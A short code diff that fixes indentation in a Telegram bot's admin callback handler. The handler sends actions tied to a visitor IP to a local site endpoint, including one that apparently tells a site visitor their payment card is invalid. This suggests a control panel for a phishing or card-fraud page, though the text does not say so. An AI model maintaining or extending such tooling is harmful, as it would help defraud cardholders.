@@ -2990,14 +2990,14 @@ async def admin_action_handler(call: types.CallbackQuery):
         print(f'[DEBUG] Processing {action.upper()} action for ip={ip}')
         if not ip:
             await call.answer("❌ Помилка: відсутній IP")
-        return
+            return
     
-    import aiohttp as aiohttp_client
-    async with aiohttp_client.ClientSession() as session:
+        import aiohttp as aiohttp_client
+        async with aiohttp_client.ClientSession() as session:
             try:
                 resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
-    
+
                 if resp.status == 200:
                     if action == 'card':
                         await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
@@ -3015,7 +3015,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                 await call.answer("❌ Помилка сервера")
         
                 print(f'[DEBUG] {action.upper()} action completed')
-        return
+                return
     elif action == 'support':
         print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
         if not ip:
